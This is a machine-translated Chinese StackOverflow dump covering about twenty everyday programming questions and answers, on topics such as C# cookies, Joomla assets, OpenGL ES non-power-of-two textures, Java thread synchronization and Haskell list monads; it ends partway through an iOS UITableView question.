# StackOverflow 问答 11427000-11427999

# c# - 如何创建以点为前缀的 cookie uri？

> ID：11427000
> 
> 赞同：3
> 
> 时间：2012-07-11T06:42:39.273
> 
> 标签：c#, .net, cookies, httpwebrequest, uri

我正在尝试传递一个 Uri`new Uri(".example.com")`

> 无效的 URI：无法确定 URI 的格式。

或者`new Uri("http://.example.com")`

> 无效的 URI：无法解析主机名。

我需要能够使用`CookieContainer.SetCookies`只有一个重载采用 Uri 的函数。

根据[this page](https://connect.microsoft.com/VisualStudio/feedback/details/478521/cookiecontainer-domain-handling-issue)，.NET 4.0 现在应该支持点前缀cookie，但Uri 类似乎不支持？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-11T07:08:12.693

在这种情况下，您需要将正确的 uri 传递给函数，并且 Uri 解析器会正确拒绝您尝试使用的格式错误的字符串。

我建议使用带有 4 个参数的[Cookie](http://msdn.microsoft.com/en-us/library/a18ka3h2.aspx)构造函数 - 允许您将域设置为以点为前缀的域。

```
Cookie(string name, string value, string path, string domain); 
```

# php - 在 joomla 组件中添加新的 Js,css 文件

> ID：11427001
> 
> 赞同：1
> 
> 时间：2012-07-11T06:42:45.993
> 
> 标签：php, file, joomla, insert, components

我想将 .js 文件和 css 文件插入到我的 joomla 组件中，并在 .php 文件中调用所有这些文件。有人知道这是什么程序吗？谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-11T18:21:10.977

现在正好在做这件事。在文件`\com_yourcomponent\views\yourview\view.html.php`中，在函数`display()`中，

```
$document->addStyleSheet('http://ajax.googleapis.com/ajax/libs/jqueryui/1.8/themes/smoothness/jquery-ui.css');
$document->addCustomTag('<script type="text/javascript" src="components/com_yourcomponent/js/jquery-1.7.2.min.js"></script>'); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-10-29T15:13:19.607

在 Joomla！2.5，我在视图 display() 中使用了以下代码：

```
JHtml::stylesheet(JURI::base() . 'components/com_mycomponent/css/mycomponent.css', array(), true); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-11T10:09:17.363

在您的组件中使用：

```
 $js = JUri::root() . 'mycssFolder/style.css';
    $doc = JFactory::getDocument();
    $doc->addScript($js); 
```

更多信息[http://docs.joomla.org/JDocument/addScript](http://docs.joomla.org/JDocument/addScript)

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-07-11T09:47:58.060

最佳提问地点：http: [//forum.joomla.org/](http://forum.joomla.org/)

好的，好的，对于downvoters：stackoverflow.com :)

# maven - clojure-maven-plugin 1.3.10 中的问题

> ID：11427002
> 
> 赞同：0
> 
> 时间：2012-07-11T06:42:47.160
> 
> 标签：maven, clojure

如何从“clojure-maven-plugin”给出编译clojure文件的顺序？

我认为它应该自动获取订单，如果有一些循环依赖，它会抛出循环依赖异常。

我的问题是当我从 git 克隆项目时，它有时会成功构建，有时会失败。当我浏览日志时，我看到该插件选择了两个不同的类在每个项目中首先编译。

在失败中抛出空指针异常，其中不存在一些 .class 文件，因为该类应该在当前类之前创建。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-11T08:00:24.400

Maven 反应器中的顺序将自动按正确顺序排序，但如果存在循环依赖关系，那么 Maven 或任何其他构建都无法处理。

# iphone - 使用 ffmpeg 和 opengl 为我的 iphone 应用程序解码 + 显示 h264 帧实现非常差的 fps

> ID：11427003
> 
> 赞同：1
> 
> 时间：2012-07-11T06:43:03.807
> 
> 标签：iphone, opengl-es, ffmpeg, h.264

我的应用程序有三个步骤，在 iPhone 屏幕上显示 h264 帧。

1.  使用 ffmpeg 解码。
2.  比例和色彩空间转换（缩放到 256 X 256 Opengl ES 1 纹理并使用 ffmpeg 中的 sws_Scale 将 colospace 从 yuv420p 转换为 rgb565）。
3.  将opengl 1纹理渲染到帧缓冲区以渲染缓冲区

经过这三个步骤的过程，我在 iPhone 屏幕上得到了我的照片。

当我测试 720 X 576 分辨率帧的性能时，我的 FPS 非常差。它达到最大 180 毫秒，因此导致 5 到 6 FPS。

任何方向将不胜感激。

# css - div一直向左滑动

> ID：11427005
> 
> 赞同：0
> 
> 时间：2012-07-11T06:43:11.980
> 
> 标签：css, html, position, margin

我有一个以我的网站为中心的 div 使用`margin: auto;`

但由于某种原因，如果我开始缩小浏览器的宽度，我在下图中显示的 div 开始随着浏览器向左移动，并且不会停留在其位置。我试过使用这个`position:`东西，但它似乎不适用于我的问题。

我怎样才能让这个 div 保持居中而不随浏览器移动？

[你可以在我的网站](http://ifaketext.com/testiframe/)上看到这个问题

如果您尝试将浏览器宽度缩小到某个点之外，则 div 刚刚开始移动并且不再居中。

这是一个问题，因为分辨率较小的人将看不到正确的网站。

似乎有问题的 div 是`main-frontpage`

![我的问题](../Images/05c725d09bf33110a83a666269325a88.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-11T09:27:14.487

将 #footer 的最小宽度更改为与 .jflow-content-slider & #main-frontpage (1050px) 相同，然后至少您的内容滑块不会与底部的文本重叠。

**编辑：**再次查看您的设置，只需将#main-frontpage 的宽度更改为与#footer #content-wrapper - 1240px 相同。真的这太宽了，应该是 960px 宽，但除非你改变你的页脚内容的宽度，否则这是唯一的方法

# c# - 是否可以以编程方式确定 ASP.NET MVC 的 Razor View 模型？

> ID：11427007
> 
> 赞同：3
> 
> 时间：2012-07-11T06:43:25.860
> 
> 标签：c#, .net, asp.net-mvc, razor

我正在手动创建一个`RazorView`实例并手动将该视图呈现给我的响应输出。

```
var errorController = new FakeErrorController();
var controllerContext =
    new ControllerContext(httpApplication.Context.Request.RequestContext,
                          errorController);
var view = new RazorView(controllerContext, viewPath, null, false, null);
var viewModel = new ErrorViewModel
                {
                    Exception = currentError
                };
var tempData = new TempDataDictionary();
var viewContext = new ViewContext(controllerContext, view,
                                    new ViewDataDictionary(viewModel), tempData,
                                    httpApplication.Response.Output);
view.Render(viewContext, httpApplication.Response.Output); 
```

工作正常。

但请注意我是如何硬编码的`ViewModel`？我想知道是否可以查看是否定义`RazorView`了强类型`ViewModel`。

例如。 `@model SomeNamespace.Model.Foo`

然后在此基础上创建一个新类型。我们还假设有一个无参数的默认构造函数。

这可能吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-11T23:27:49.193

您可以使用以下代码获取 View 的类型：

```
((ViewResult)otherController.Index()).Model.GetType() 
```

这里的重点是我们必须将 ActionResult 转换为 ViewResult。但是，如果您的操作返回从 ActionResult 继承的其他类型（如 HttpResult 等），这还不够。

有了类型，您可以使用反射来实例化它。

但是，我们只能在方法调用之后获取类型，我相信这不是你的情况。

希望它会有所帮助。

问候。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-10T11:43:21.050

该方法的概括会起作用吗？

诸如...之类的东西

```
public void MyMethod<T>(...)
    where T : class, new()
{
   // Your code
   var model = Activator.CreateInstance<T>();
   // More code
} 
```

# android - OpenGL ES 2.0 纹理未在某些设备上显示

> ID：11427010
> 
> 赞同：1
> 
> 时间：2012-07-11T06:43:28.033
> 
> 标签：android, opengl-es, opengl-es-2.0, textures, galaxy

[我找到了一个名为Rajawali](http://www.rozengain.com/blog/2011/08/23/announcing-rajawali-an-opengl-es-2-0-based-3d-framework-for-android/)的 Android 3D 图形框架，我正在学习如何使用它。我遵循了最基本的教程，它使用 1024x512 大小的 jpg 图像为纹理渲染一个 shpere 对象。它在 Galaxy Nexus 上运行良好，但在 Galaxy Player GB70 上却无法运行。

当我说它不起作用时，我的意思是对象出现了，但没有渲染纹理。最终，我更改了一些在创建纹理时用于 Rajawali 框架的参数并使其工作。这是我发现的。

原因来自`GL_TEXTURE_MIN_FILTER`设置的地方。在以下四个值中

```
GLES20.GL_LINEAR_MIPMAP_LINEAR
GLES20.GL_NEAREST_MIPMAP_NEAREST
GLES20.GL_LINEAR
GLES20.GL_NEAREST 
```

`GL_TEXTURE_MIN_FILTER`仅当未使用 mipmap 将纹理设置为过滤器时才会渲染纹理。因此，当`GL_TEXTURE_MIN_FILTER`设置为最后两个时，它可以工作。

现在这是我不明白和好奇的地方。当我将用作纹理的图像缩小到 512x512 大小时，`GL_TEXTURE_MIN_FILTER`设置无关紧要。最小过滤器的所有四个设置都有效。

所以我的问题是，对纹理使用最小过滤器时对图像的尺寸有要求吗？比如我需要使用正方形的图像吗？其他的东西，比如包装样式或磁过滤器的配置是否有问题？

或者它看起来像是设备的 OpenGL 实现错误？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-07-11T07:29:20.713

早上好，这是 2 纹理非幂的典型示例。

出于多种原因，纹理的分辨率必须是 2 的幂，这是一个非常常见的错误，每个人都遇到过这个陷阱：）我也是。

事实上，非幂 2 纹理在某些设备/GPU 上可以顺利运行，这仅取决于 OpenGL 驱动程序的实现，一些 GPU 清楚地支持它们，而另一些则不支持，我强烈建议您使用 pow2 纹理以便能够以保证所有设备的功能。

最后但同样重要的是，使用非 2 次幂纹理可能会导致 GPU 内存利用率出现灾难性场景，因为大多数接受非 2 次幂纹理的驱动程序需要在内存中将纹理重新缩放到最接近的 2 次幂系数. 例如，具有 520X520 的纹理可能导致 1024X1024 的实际内存映射。

这是您不想要的，因为在现实世界中“大小很重要”，尤其是在移动设备上。

你可以在 OpenGL Gold Book OpenGL ES 2.0 中找到一个很好的解释：

> 在 OpenGL ES 2.0 中，纹理可以具有非二次方 (npot) 维度。换言之，宽度和高度不需要是2的幂。但是，如果纹理尺寸不是 2 的幂，OpenGL ES 2.0 确实对可以使用的环绕模式有限制。也就是说，对于 npot 纹理，包裹模式只能是 GL_CLAMP_TO_EDGE，而缩小过滤器只能是 GL_NEAREST 或 GL_LINEAR（换句话说，不是 mip-mapped）。扩展 GL_OES_texture_npot 放宽了这些限制并允许 GL_REPEAT 和 GL_MIRRORED_REPEAT 的包装模式，还允许使用完整的缩小过滤器集对 npot 纹理进行 mipmap。

我建议你评估这本书，因为它对这个主题做了相当不错的覆盖。

# ruby-on-rails - 通过路由器在手机上进行 Facebook 身份验证 (Ruby on Rails - OmniAuth)

> ID：11427011
> 
> 赞同：1
> 
> 时间：2012-07-11T06:43:31.177
> 
> 标签：ruby-on-rails, omniauth, facebook-authentication

我正在为手机制作一个应用程序，我需要使用 Twitter 和 Facebook 身份验证。

我正在开发的 PC 和手机（Samsung Galaxy S2）连接到一个路由器。

我的电脑 IP 是 10.4.1.6。对于 Twitter 身份验证，我只需输入 callback_url`"http://10.4.1.6:3000"`并且一切正常，但对于 Facebook 身份验证，我得到：

```
"Invalid redirect_uri: Given URL is not allowed by the Application configuration." 
```

我想如果我无法输入路由器的 IP，那么我可以在手机和 PC 上编辑主机文件以指向我的 Rails 服务器，但仍然没有运气。

当我尝试输入`"http://rails_dev_work_pc.com:3000"`时，Facebook 告诉我 URL 无效。我该如何解决这个错误？

编辑：
我试图输入这个：

*   域=>“localhost.com”
*   callback_url => " [http://localhost.com:3000/auth/facebook/callback](http://localhost.com:3000/auth/facebook/callback) "
*   在电脑主机=>“127.0.1.1 localhost.com”；
*   在电话主机=>“10.4.1.6 localhost.com

但是我在手机和电脑上遇到了同样的错误。

还：

*   域=>“本地主机”
*   callback_url => " [http://localhost:3000/auth/facebook/callback](http://localhost:3000/auth/facebook/callback) "
*   在我的电脑主机中=>“127.0.1.1 localhost”；
*   在电话主机=>“10.4.1.6 localhost

在 PC 上工作正常，但在我的手机上出现无效 URL 错误。

我没主意了。。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-11T07:15:10.637

我正在使用这个设置：

在 hosts 文件中，路由`localhost`到`localhost.com`（或任何您喜欢的）。现在您应该可以使用以下 facebook 应用程序配置：

```
App Domain(s): localhost.com
Website for facebook login: http://localhost.com:3000/
Canvas-URL (optional): http://localhost.com:3000/<yourfacebookendpoint> 
```

请让我知道这是否也适合您。此外，我发现拥有 2 个 facebook 应用程序非常有帮助 - 一个用于生产（指向您的生产应用程序 URL），一个仅用于测试（指向您在 HOSTS 文件中配置的 URL）。这样，您可以在不中断生产应用程序的情况下进行测试。

# 编辑

这是@ExEdzy 作为对此答案的编辑发布的最终解决方案：

我刚刚将主机文件中的“localhost localhost.com”更改为“ip localhost.com”

在我的手机中，ip 是我电脑的 ip（10.4.1.6）。在我的电脑主机文件中，IP 是“127.0.0.1”

在 facebook 中： - App Domains: => "http://localhost.com:3000" - Site URL: => "http://localhost.com:3000/auth/facebook/callback" 就像一个魅力。

# c# - 在 C# 中使用 PHP 的 Webservice

> ID：11427022
> 
> 赞同：2
> 
> 时间：2012-07-11T06:44:15.007
> 
> 标签：c#, php, json, web-services

如何在 C# 中访问用 PHP 开发的 Web 服务。

这是链接：http: [//xxx.in/WS/getCities.php ?wsdl](http://xxx.in/WS/getCities.php?wsdl)

我只想从中调用`getCities()`方法。

我用 C# 编写了这样的代码：

```
Chanllange.LocationInformationService ls = new  Chanllange.LocationInformationService();
t1.Text= ls.getCities(); 
```

我得到了 json 格式的输出，如何在 c# 中显示该值。

如果您需要更多信息，请告诉我。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-11T09:06:55.970

如果有帮助，请参阅[Parse JSON in C# 。](https://stackoverflow.com/questions/1212344/parse-json-in-c-sharp)您需要创建一个类来获取 json 格式的数据。从那里您可以使用 JSON 类并继续前进。

例如

有一个类 public class Person { private string _FirstName; 私有字符串 _LastName; 私有字符串 _MiddleName;

```
 public string FirstName
    {
        get { return this._FirstName; }
        set { this._FirstName= value; }
    }

    public string LastName
    {
        get { return this._LastName; }
        set { this._LastName= value; }
    }

    public string MiddleName
    {
        get { return this._MiddleName; }
        set { this._MiddleName= value; }
    }

} 
```

并且有一个方法来填充这个类

```
public void ReadJSON(string jsonInput)

{

  JavaScriptSerializer jsonSerializer = new JavaScriptSerializer();

  Person singlePerson  = jsonSerializer.Deserialize<Person>(jsonInput)

} 
```

# php - FLOW3：多数据库的初始化

> ID：11427029
> 
> 赞同：2
> 
> 时间：2012-07-11T06:45:12.137
> 
> 标签：php, database, doctrine, typo3-flow

我想准备两个数据库连接，因为第一个是网站的东西（例如博客、帖子等），另一个是帐户数据。帐户数据在另一个数据库中，因为它是我的身份验证数据库，具有 FTP、SSH、IMAP 等权限。

密码使用 Mysql 函数 ENCRYPT 进行哈希处理。所以我必须创建一个新的 Cryptography、Provider 和 Token。我不想改变我的数据库的结构。

（这是 FLOW3 版本 1.1beta2）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-03T13:53:07.070

很简单：

我必须在我的 mysql 数据库中准备一个单独的数据库。这不是正确的解决方案，但它是一种可能性。 [创建服务器（dev.mysql.com）](http://dev.mysql.com/doc/refman/5.1/en/create-server.html)

# java - 只有一个线程可以访问代码的某个部分？

> ID：11427030
> 
> 赞同：2
> 
> 时间：2012-07-11T06:45:39.590
> 
> 标签：java, multithreading

我有一个项目需要不时登录我的路由器并进行一些更改。在 Eclipse 中，我有一个单独的项目来处理我需要更改的所有内容，并且我在我的主项目的构建路径中拥有它，这是一个多线程项目。我的问题是，有时两个线程试图访问路由器，这把事情搞砸了。有什么我可以做的，只有一个线程可以访问我的代码的特定部分。

这是主多线程应用程序的相关代码

```
if (totalLogins > 10)
{
  IpManager.rebootRouter();
  Thread.sleep(4000);
  totalLogins = 0;
  composedMessagesWithThisIP = 0;
} 
```

在另一个项目中，这就是我所拥有的

```
public synchronized static void rebootRouter()
{
  try
  {
    //code related to restart modem
  }
  catch (Exception e)
  {

  }
} 
```

所以我所做的是使方法同步，但我相信不时有多个线程访问“rebo​​otRouter”方法。这会导致我的主要应用程序出现问题。

使 IpManager.rebootRouter() 仅由一个线程执行的最佳方法和最有效的方法是什么？

问候！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-11T06:56:01.113

`synchronized`保证一次只有一个线程可以进入块，但是同一个线程可以多次进入块（所以线程不会对自己死锁），如果一个线程因为另一个线程在那里而被阻塞，那么它可能在第一个线程离开同步块后立即运行。

首先，我会在例程的入口和出口点记录日志。我会检查您是否正在进行任何递归，并确保调用确实同时运行。另外，请记住，如果有任何异步工作或回调，同步块可能会退出。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-11T07:01:34.873

使用**Semaphore** from `java.util.concurrent package`,**限制**访问对象的线程数。

**例子：**

在此代码片段中，一次只有 1 个线程可以访问该对象。

```
Semaphore s = new Semaphore(1);  

s.acquire();

synchronized(this){

// Your modem work

}

s.release(); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-11T07:08:58.630

`So what I have done is made the method synchronized but I believe from time to time more than one thread access the "rebootRouter" method.`

正如您已标记此方法，因为`synchronized`它保证多个线程不能同时执行此方法。可能是代码中`// Your modem work`有一些`unsynchronized` 可能导致问题的东西。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-11T07:42:17.973

> 我的问题是，有时两个线程试图访问路由器，这把事情搞砸了。有什么我可以做的，只有一个线程可以访问我的代码的特定部分。

定义“搞砸了”。由于`rebootRouter`是同步的，因此在任何给定时间只有一个线程可以运行该方法。但是，如果一个线程，称为线程 A，在另一个线程（线程 B）运行它时尝试调用它，线程 A 将阻塞，直到 B 从 中返回`rebootRouter`，然后 A 将直接调用`rebootRouter`它自己。如果这是您想要的行为，那么您的问题就在其他地方（`synchronized`没有损坏，或者有人会注意到）。

如果您希望上面示例中的线程 A 在上面示例`rebootRouter`中被另一个线程调用时不调用，您可以使用[`Lock.tryLock`](http://docs.oracle.com/javase/7/docs/api/java/util/concurrent/locks/Lock.html#tryLock%28%29)：

```
private static final Lock lock = new ReentrantLock();
public static void rebootRouter() {
  if (!lock.tryLock()) return;
  try {
    //code related to restart modem
  } catch (Exception e) {
    // Note: Empty catch blocks considered bad style
  } finally {
    lock.unlock();
  }
} 
```

如果您的需求更具体，您可能需要重新表述您的问题。

# java - 我想在Java中使用关于随机索引的索引

> ID：11427031
> 
> 赞同：3
> 
> 时间：2012-07-11T06:45:41.183
> 
> 标签：java, arraylist, indexing

我使用Java。当我在 Java 中使用 ArrayList 时。如果我随机访问索引号。

这可能吗？

如果这是不可能的。我应该怎么做？

例如

```
ArrayList<String> al = new ArrayList<String>();
al.add(100,"stackoverflow"); 
```

这可能吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-07-11T06:50:08.293

您似乎需要的不是 arrayList 而是整数和字符串之间的映射：

```
HashMap<Integer,String> mymap = new HashMap<Integer,String>(); 
```

所以你可以写

```
mymap.put(100,"stackoverflow"); 
```

和

```
String myString = mymap.get(100); 
```

添加为什么不能使用数组列表：

首次初始化 ArrayList 时，大小为零。尝试在大于大小的索引处添加仍然会引发 IndexOutOfBounds 异常，就像数组一样。ArrayList 的好处是它会在大小填满时动态分配更多内存。

此外，即使您努力管理大小以避免错误，数组对于“稀疏数组”也不是有效的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-11T06:48:29.943

```
int index = (int)(Math.random() * myArray.size());
Object o = myArray.get(index); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-11T06:49:00.380

**是的...你可以..** ArrayList 提供了很多灵活性，例如删除、添加、indexOf..等。

**例如：**

```
ArrayList<String> arr = new ArrayList<String>();

arr.add("vivek");
arr.add("vicky");

arr.get(1); 
```

**编辑部分：**

如果直接尝试在第 100 个元素的大小小于该值时添加元素，则会出现以下错误：

```
java.lang.IndexOutOfBoundsException: 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-11T06:56:45.573

`Is this posible?`

是的，你可以。如下所示

```
 List<String> list=new ArrayList<String>();

    for(int i=0;i <10;i++)
    {
        list.add(i,new Integer(i).toString());
    }

    System.out.println(list.get(5)); 
```

如果你想使用随机数，那么你应该生成数字，你可以添加到该索引中。

# javascript - 用户为下一次输入插入数据后清空文本字段

> ID：11427032
> 
> 赞同：3
> 
> 时间：2012-07-11T06:45:41.493
> 
> 标签：javascript, jquery, asp.net-mvc-3, jquery-ui

我正在使用显示输入框弹出窗口的 jquery。当用户输入数据并提交时，我将操作重定向到相同的插入操作，以便可以刷新文本字段。首先显示输入的弹出窗口，但是当我提交之前显示的弹出窗口保持原样并弹出新的显示输入框，每次单击插入时都会刷新输入框。如何关闭上一个弹出窗口并仅显示新弹出窗口。并请说明在用户输入数据后清空文本框的方法，以便他可以输入下一个数据。

jquery 在我的布局

```
 <script type="text/javascript">

            $.ajaxSetup({ cache: false });

            $(document).ready(function () {
                $(".openDialog").live("click", function (e) {
                    e.preventDefault();

                    $("<div></div>")
                    .addClass("dialog")
                    .attr("id", $(this)
                    .attr("data-dialog-id"))
                    .appendTo("body")
                    .dialog({
                        title: $(this).attr("data-dialog-title"),
                        minWidth: 500,
                        minHeight: 100,
                        resizable: false,
                        close: function () { $(this).remove() },
                        modal: true
                    })

                    .load(this.href);
                });

                $(".close").live("click", function (e) {
                    e.preventDefault();
                    $(this).closest(".dialog").dialog("close");                    
                });
            });
    </script>
</head> 
```

当我单击按钮以获取输入框时，这会显示弹出窗口

下面是我在插入视图中的 jquery

```
</script>
 <script type="text/javascript">
     $(function () {
         $('form').submit(function () {
                $("#popUp").dialog(
             {

                 title: $(this).attr("data-dialog-title"),
                 minWidth: 500,
                 resizable: false,

                 modal: true,

                 buttons: {
                     Close: function () {

                         $(this).dialog("close");

                     }
                 }

             }
             );

         });
     });

    </script> 
```

这显示了从此页面执行的操作的弹出窗口。即错误消息并插入另一个用户表单。因此，弹出窗口是从布局视图生成的，下一个弹出窗口是从插入视图生成的。我试图在生成来自插入视图的弹出窗口时关闭布局视图中的弹出窗口，或者以某种方式在插入视图中清除文本字段而不显示第二个弹出窗口。我该怎么办。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T01:50:46.793

这是您在下面的代码中想要的行。我将其与注释内联以表示，但我也将其放在这里以便于查找： `$(this).find("input").val("");`

```
 $('form').submit(function () {
            $("#popUp").dialog(
         {

             title: $(this).attr("data-dialog-title"),
             minWidth: 500,
             resizable: false,

             modal: true,

             buttons: {
                 Close: function () {
                     //This line below is what you need to clear the field
                     $(this).find("input").val("");
                     $(this).dialog("close");

                 }
             }

         }
         );

     }); 
```

# javascript - JqueryGrid 在 Chrome 和 Safari 中无法正确呈现

> ID：11427033
> 
> 赞同：1
> 
> 时间：2012-07-11T06:45:42.097
> 
> 标签：javascript, jquery, jqgrid

目前我正在使用 Chrome v20.0.1132.47 和 jqGrid 插件 v4.3.1

问题是 Chrome 和 Safari 浏览器中的网格宽度尺寸较小。

我正在尝试对我的 jqGrid 插件进行一些更改，这些地方是：

1) 在`isSafari` 2) 内`showHideCol` 3) 内的定义`setGridWidth`

基于帖子[jqGrid 在 Chrome/Chrome Frame 中无法正确呈现](https://stackoverflow.com/questions/10588587/jqgrid-does-not-render-correctly-in-chrome-chrome-frame)。但不幸的是，它不起作用。所以请让我知道我需要在哪里更改我的插件？

**更新1：**我更改了我的 jqGrid 插件行，`parseFloat($.browser.version)<536.11` 而不是`parseFloat($.browser.version)<536.5`现在它在我的 Chrome 浏览器中工作。但现在仍然无法在 Safari v5.1.2(7534.52.7) 中运行。

谢谢

# jquery - 为 jquery 数据表创建循环？

> ID：11427035
> 
> 赞同：1
> 
> 时间：2012-07-11T06:45:53.527
> 
> 标签：jquery

```
/*
 * SQL queries
 * Get data to display
 */
$sQuery = "
        SELECT SQL_CALC_FOUND_ROWS `" . str_replace(" , ", " ", implode("`, `", $aColumns)) . "`
        FROM   $sTable
        $sWhere
        $sOrder
        $sLimit
        ";
$rResult = mysql_query($sQuery, $gaSql['link']) or fatal_error('MySQL Error: ' . mysql_errno()); 
```

这是在数据表中指定的方式……但我的想法是这样的……

```
for($i==0;$i<count($val);$i++){
$con ='ID='.$val[$i];

$sQuery = "
        SELECT SQL_CALC_FOUND_ROWS `" . str_replace(" , ", " ", implode("`, `", $aColumns)) . "`
        FROM   $sTable
        $sWhere
                $con 
        $sOrder
        $sLimit
        ";
$rResult = mysql_query($sQuery, $gaSql['link']) or fatal_error('MySQL Error: ' . mysql_errno());
} 
```

我有以下问题：

1.  我可以这样使用吗？
2.  数据表会支持它吗？
3.  或者我们可以对该数组结果进行编码吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-11T06:50:30.100

只要您返回一个 JSON 对象数组或内部数组，DataTables 就会很好地接受它 - 请参阅：[http](http://datatables.net/blog/Extended_data_source_options_with_DataTables) ://datatables.net/blog/Extended_data_source_options_with_DataTables 。

此外，如果您使用服务器端处理，那么您必须遵守 DataTables 所需的协议，此处记录：http: [//datatables.net/usage/server-side](http://datatables.net/usage/server-side)

# ember.js - Ember-Data 如何知道何时获取实体

> ID：11427039
> 
> 赞同：5
> 
> 时间：2012-07-11T06:46:40.917
> 
> 标签：ember.js, ember-data

了解何时从 ember-data 中的远程存储中检索到实体的最佳方法是什么？

我需要调用以检索数据，但我需要从获取的 ember-data 对象中获取一些值。

目前我正在使用这种方法，但我相信有更好的方法。

```
contactLoaded: function(){
  if(!this.getPath('contact.isLoaded')){
    return;
  }

  //make call
}.observes('App.contact.isLoaded') 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-11T08:48:55.850

我担心这是实现你目标的唯一方法，截至今天...... :-/

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-01T07:22:20.893

你也可以做

```
model.one('didLoad', function() {
   alert("I LOADED!";
}); 
```

根据您要查找的异步事件，将 didLoad 替换为 didCreate、didUpdate 等。

`one`将观察对象`didLoad`以触发事件，并且不会多次触发。用来`on`继续看。

# haskell - 如何使用 Monad-List 构建函数？

> ID：11427051
> 
> 赞同：2
> 
> 时间：2012-07-11T06:47:50.090
> 
> 标签：haskell

我在使用 monad-list 构建函数时遇到问题

```
 > multab 4
 ["1*1=1","1*2=2","1*3=3","1*4=4","2*2=4","2*3=6","2*4=8","3*3=9","3*4=12","4*4=16"] 
```

所以我想开始：

```
multab :: Integer -> [String] 
```

剩下的，你有什么建议吗？

提前致谢。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-07-11T07:53:13.557

基本上你想生成一个条目列表，然后打印它们。

让我们从条目开始。这些由两个整数及其乘积组成。所以让我们定义一个类型同义词来保存两个整数

```
type Entry = (Integer, Integer) 
```

以及计算这些整数乘积的评估函数，

```
eval :: Entry -> Integer
eval = uncurry (*) 
```

然后，我们定义一个生成条目的函数：

```
gen :: Integer -> [Entry]
gen n = [(i, j) | i <- [1 .. n], j <- [i .. n]] 
```

例如：

```
> gen 4
[(1,1),(1,2),(1,3),(1,4),(2,2),(2,3),(2,4),(3,3),(3,4),(4,4)] 
```

接下来，我们需要能够打印一个条目：

```
showEntry :: Entry -> String
showEntry e@(i, j) = show   i ++ "*"    ++ show j ++ "=" ++ show (eval  e) 
```

例如：

```
> showEntry (2, 3)
"2*3=6" 
```

最后，让我们将这些部分粘合在一起：

```
multab :: Integer -> [String]
multab = map showEntry . gen 
```

开始了：

```
> multab 4
["1*1=1","1*2=2","1*3=3","1*4=4","2*2=4","2*3=6","2*4=8","3*3=9","3*4=12","4*4=16"] 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-11T07:36:46.747

这是一些基于 Karolis 答案的临时解决方案。

```
> let nonDec xs = and $ zipWith (>=) (drop 1 xs) xs
nonDec :: Ord b => [b] -> Bool

> let getSets s n = filter nonDec $ replicateM n s
getSets :: Ord b => [b] -> Int -> [[b]]

> getSets [1,2,3,4] 2
[[1,1],[1,2],[1,3],[1,4],[2,2],[2,3],[2,4],[3,3],[3,4],[4,4]]

> let showExp = \[i,j] -> show i ++ "*" ++ show j ++ "=" ++ show (i*j)
showExp :: [Integer] -> [Char]

> map showExp $ getSets [1,2,3,4] 2
["1*1=1","1*2=2","1*3=3","1*4=4","2*2=4","2*3=6","2*4=8","3*3=9","3*4=12","4*4=16"] 
```

所以，`multab`是`\n -> map showExp $ getSets [1..n] 2`。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-07-11T07:09:05.240

执行此操作的自然方法是生成一个包含 or 的所有对的列表，`(i, j)`然后`i <`对其`= j`进行映射`(\(i, j) -> show i ++ "*" ++ show j ++ "=" ++ show (i*j))`。生成此类列表的最明显方法是编写`[(i, j) | i <- [1..n], j <- [1..n], i <= j]`. 尽管这样做可能会更好，`[1..n] >>= list where list i = map (\k -> (i, k)) [i..n]`因为这不会进行任何过滤（因为它不会生成不需要的对）。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-07-11T14:42:42.903

就像使用 List 作为 Monad 的其他答案的替代方案一样。

```
multab :: Integer -> [String]
multab n = do
    i <- [1..n]
    j <- [i..n]
    return $ show i ++ "*" ++ show j ++ "=" ++ show (i*j) 
```

其中前两个规则将每对整数`(i,j)`与`j <= i <= n`. 最后一条规则返回打印的值。

更实用的可能是列表理解版本

```
multab2 :: Integer -> [String]
multab2 n =
    [ show i ++ "*" ++ show j ++ "=" ++ show (i*j)
    | i <- [1..n]
    , j <- [i..n] ] 
```

正如结构所暗示的那样，它可以直接翻译成 monad 版本，尽管这不是最有效的翻译。此外，这等同于从 dblhelix 的答案中内联所有函数时所获得的结果。

# ipad - UITableview 的滑动删除行问题

> ID：11427052
> 
> 赞同：1
> 
> 时间：2012-07-11T06:47:51.043
> 
> 标签：ipad, uitableview, ios-simulator

这会让我发疯的！很多类似的问题，但我似乎仍然无法弄清楚为什么我的这个滑动删除代码不起作用！“删除”按钮只是没有出现。与设备相比，在模拟器中的 UITableview 单元格中是否有一些特殊的滑动方式？这是代码，

`- (BOOL)tableView:(UITableView *)tableView canEditRowAtIndexPath:(NSIndexPath *)indexPath`

 ````
{

return YES;
}

-(UITableViewCellEditingStyle)tableView:(UITableView *)tableView editingStyleForRowAtIndexPath:(NSIndexPath *)indexPath
{
return UITableViewCellEditingStyleDelete;
}

